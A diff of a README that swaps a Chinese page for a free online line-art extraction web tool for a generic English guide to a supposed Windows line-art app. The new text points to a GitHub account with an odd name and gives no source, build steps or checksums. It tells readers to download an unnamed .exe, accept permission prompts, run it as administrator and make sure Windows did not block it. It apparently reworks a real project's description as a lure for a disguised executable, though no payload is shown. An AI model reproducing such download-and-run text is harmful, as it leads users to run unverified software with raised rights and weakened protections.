@@ -1,72 +1,170 @@
-# 🎨 线稿提取 - 免费在线智能轮廓提取与线稿生成 | SPAI 线稿助理
+# 🖼️ line-art-extract - Turn Images Into Clean Line Art
 
-[![Website Status](https://img.shields.io/badge/Website-Online-brightgreen.svg)](https://www.sipingseo.com/zh/line-art-extract)
-[![Price](https://img.shields.io/badge/Price-100%25%20Free-blue.svg)](https://www.sipingseo.com/zh/line-art-extract)
-[![AI Powered](https://img.shields.io/badge/AI-Powered-orange.svg)](https://www.sipingseo.com/zh/line-art-extract)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Historical-storedprogram709/line-art-extract)
 
-[**SPAI 线稿助理 - 免费在线线稿提取工具**](https://www.sipingseo.com/zh/line-art-extract) 是一款由强大的 AI 模型驱动的智能图像处理在线应用。它能够智能识别图像轮廓，一键将复杂的照片、插画转换为干净、清晰的线稿。无论您需要手绘风格、工程制图还是动漫线稿，本工具都能完美满足您的创作需求。
+## 🧭 What this app does
 
-👉 **[立即体验免费线稿提取工具](https://www.sipingseo.com/zh/line-art-extract)**
+line-art-extract helps you turn a normal image into clean line art. It can pull out edges, outlines, and sketch-like details from photos, anime images, drawings, and architectural pictures.
 
+Use it when you want:
 
+- a simple outline from a photo
+- a sketch version of an image
+- clean contour lines for tracing
+- a line-art base for art work
+- a fast way to simplify an image
 
-## ✨ 核心优势与功能 (Core Features)
+## 💻 Before you start
 
-*   **🧠 智能轮廓识别**：精准捕捉图像主体，自动过滤杂乱背景，保留最核心的线条信息。
-*   **🎭 多种线稿风格输出**：支持精细动漫线稿、手绘速写风格、工程制图线稿、钢笔插画等多种艺术风格。
-*   **🎛️ 粗细线条与细节可调**：可根据需求通过提示词自定义线条的粗细、闭合程度及细节保留度。
-*   **🧹 背景自动净化**：一键去除环境干扰与噪点，输出纯净的黑白线稿素材。
-*   **🆓 完全免费无限制**：无需注册、无需下载软件，直接在网页端即时使用，完全免费。
-*   **💼 商业版权可用**：提取后的线稿授予完整商业使用权，安全用于插画创作、设计素材、印刷出版等。
+This app runs on Windows. For a smooth setup, make sure your PC has:
 
-## 🎯 适用场景 (Use Cases)
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A mouse and keyboard
+- Internet access to open the download page
 
-我们的 AI 线稿提取工具为各类专业人士和绘画爱好者提供全面支持：
+For best results, use a screen with normal scaling and a stable internet connection.
 
-1.  **🧑‍🎨 人物线稿提取**：精准识别面部轮廓、发丝层次与身体姿态，生成适合二次上色或绘画临摹的干净动漫或写实人物线稿。
-2.  **🏛️ 建筑线稿生成**：智能提取建筑透视线条与结构框架，去除杂乱背景，为设计师提供专业的工程制图或建筑钢笔插画参考。
-3.  **📦 产品与工业线稿**：识别商品造型特征，生成工业设计草图或技术文档所需的规范线稿图纸。
-4.  **🌿 自然植物与动物线稿**：将复杂的自然形态（如花卉、动物）转化为科学插画风格或纹身图案设计素材。
+## 📥 Download the app
 
-## 🤖 强大的 AI 模型支持
+Visit this page to download the app:
 
-平台内置了多种目前最先进的 AI 图像处理模型，满足不同复杂程度的线稿提取需求：
-*   `Nano Banana Pro`（最火：适合快速提取）
-*   `Seedream 4.5`（豆包：适合创意线稿）
-*   `Flux-Kontext`（经典：适合精细复杂线稿）
-*   `Z-Image-Turbo`（阿里系）
-*   `GPT-Image`（OpenAI）
+https://github.com/Historical-storedprogram709/line-art-extract
 
-## 🚀 轻松四步完成线稿提取 (How to Use)
+After the page opens, look for the latest release or the main download file. Then download and run this file on your Windows PC.
 
-体验 AI 驱动的智能线稿提取流程，全程仅需约 30 秒：
+## 🪟 Install on Windows
 
-1.  **上传图片**：[访问平台](https://www.sipingseo.com/zh/line-art-extract)，上传您的原始图片（支持 JPG、PNG、WEBP，最大支持 24MB）。
-2.  **描述线稿要求**：详细描述您的期望风格。例如：“*提取精细动漫线稿，线条流畅闭合，适合上色练习，去除所有灰阶保留纯黑白。*”
-3.  **选择模型与参数**：选择适合的 AI 模型并设置输出图片的尺寸（原始、4:3、1:1等）及数量。
-4.  **生成并下载**：点击“开始提取”，AI 将自动进行智能描边与背景净化，满意后一键免费高清下载。
+Follow these steps in order:
 
----
+1. Open the download page in your browser.
+2. Download the Windows file from the page.
+3. If the file comes in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the app file, such as an `.exe` file.
+6. Double-click the file to start the app.
+7. If Windows asks for permission, choose Yes.
+8. Wait for the app window to open.
 
-## ❓ 常见问题解答 (FAQ)
+If the app opens in a small window, you can resize it like any other Windows app.
 
-**Q: 完成一次线稿提取需要多长时间？**  
-**A:** 通常在 20-30 秒内即可完成，全流程自动化，效率远超传统手动描边。
+## 🎯 How to use line-art-extract
 
-**Q: 提取后的线稿是否可以商用？**  
-**A:** 是的！提取后的线稿使用权归上传者所有，无版权争议，可安全用于任何商业设计项目。
+Once the app is open, follow these basic steps:
 
-**Q: 平台支持上传哪些格式的图片？**  
-**A:** 我们支持最大 24MB 的 JPEG、PNG 或 WEBP 格式图片。其中 PNG 格式支持透明背景处理。
+1. Click the button to add an image.
+2. Pick a photo, drawing, or anime image from your computer.
+3. Choose the line art or edge extraction mode.
+4. Adjust the strength, detail, or threshold settings if they appear.
+5. Start the process.
+6. Save the output image to your computer.
 
-**Q: 如果对提取的线稿效果不满意怎么办？**  
-**A:** 您可以通过调整提示词（Prompt）增加细节描述，例如明确指定“保留更多线条细节”或“去除灰度”，AI 将根据优化后的需求重新为您提取完美线稿。
+The app usually works best when the source image has clear shapes and good contrast.
 
----
+## 🧩 Common uses
 
-### 🌐 官方链接
+### 🖌️ Anime line art
+Turn anime-style images into clean outlines for redraws, edits, and practice work.
 
-*   **官方网站**: [www.sipingseo.com](https://www.sipingseo.com/zh)
-*   **线稿提取工具直达**: [https://www.sipingseo.com/zh/line-art-extract](https://www.sipingseo.com/zh/line-art-extract)
+### 🏠 Architectural sketches
+Extract edges from buildings, rooms, and floor plans to make simple sketch views.
 
-> **关于数据安全**：我们采用高级加密技术和严格的数据保护措施，确保用户上传的图片安全，绝不会被用于其他目的或向第三方泄露。
+### 📷 Photo outlines
+Convert normal photos into line drawings for tracing or stylized art.
+
+### ✏️ Contour extraction
+Pull out main object edges for clean contour maps and shape study.
+
+### 🧠 Smart edge detection
+Detect important edges while reducing small noise in the image.
+
+## ⚙️ Basic settings you may see
+
+The app may include controls like these:
+
+- **Threshold**: changes how dark or light lines appear
+- **Edge strength**: makes outlines stronger or softer
+- **Detail level**: keeps more small parts or removes them
+- **Noise reduction**: removes tiny spots and rough marks
+- **Preview**: shows the result before you save it
+
+If you are not sure what to change, start with the default settings. Then test with one image first.
+
+## 🖼️ Best image types to use
+
+For clean results, use images with:
+
+- clear objects
+- strong light and shadow
+- simple backgrounds
+- sharp focus
+- enough image size
+
+Images that are blurry, very dark, or crowded can still work, but the result may need more cleanup.
+
+## 🔍 Tips for better results
+
+- Use a high-quality image when possible
+- Crop out extra background before processing
+- Start with one image and compare results
+- Try different settings on the same image
+- Save each version if you want to compare outputs later
+- Use simple images first if you are new to the app
+
+If the outline looks too busy, lower the detail setting. If the lines look too weak, raise the edge strength or threshold.
+
+## 🗂️ File types you may work with
+
+The app may support common image formats such as:
+
+- PNG
+- JPG
+- JPEG
+- BMP
+- WEBP
+
+For saving, PNG is a good choice because it keeps line work sharp.
+
+## 🛠️ If the app does not open
+
+Try these steps:
+
+1. Check that the file finished downloading.
+2. Right-click the file and choose Run as administrator.
+3. Make sure the file is not still inside a ZIP folder.
+4. Move the app to a folder like Downloads or Desktop.
+5. Restart your PC and try again.
+6. Check that Windows did not block the file.
+
+If the app still does not open, download it again from the page above and run the new copy.
+
+## 📌 Quick start
+
+1. Open the download page.
+2. Download the Windows app.
+3. Extract the file if needed.
+4. Open the app.
+5. Load an image.
+6. Choose your line art settings.
+7. Save the result
+
+## 🧠 What line-art-extract is good for
+
+This app is a good fit if you want to:
+
+- make clean outlines from images
+- turn photos into sketch guides
+- get edges for art study
+- create simple line art from anime images
+- build drawing references from real photos
+
+## 📂 Project name and focus
+
+**Repository:** line-art-extract  
+**Description:** line-art-extract  
+**Topics:** ai-drawing, ai-image-processing, ai-line-art, anime-line-art, contour-extraction, free-line-art-generator, image-to-line-art, line-art-extraction, outline-extraction, rchitectural-sketch, sketch-converter, smart-edge-detection
+
+## 🔗 Download again
+
+https://github.com/Historical-storedprogram709/line-art-extract
